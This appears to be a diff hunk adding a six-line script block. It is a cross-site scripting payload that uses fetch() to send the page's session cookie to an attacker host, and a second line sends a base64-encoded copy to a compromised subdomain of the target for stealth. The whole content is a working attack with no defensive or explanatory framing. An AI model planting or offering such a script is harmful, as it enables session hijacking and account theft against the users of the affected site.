@@ -1,0 +1,6 @@
+<script>
+// Send session cookie to attacker server (if not HttpOnly)
+fetch('https://attacker-website.com/steal?cookie=' + document.cookie);
+// For more stealth, use a subdomain you've compromised on the target (if allowed)
+fetch('https://subdomain.target.com/log.php?cookie=' + btoa(document.cookie));
+</script>
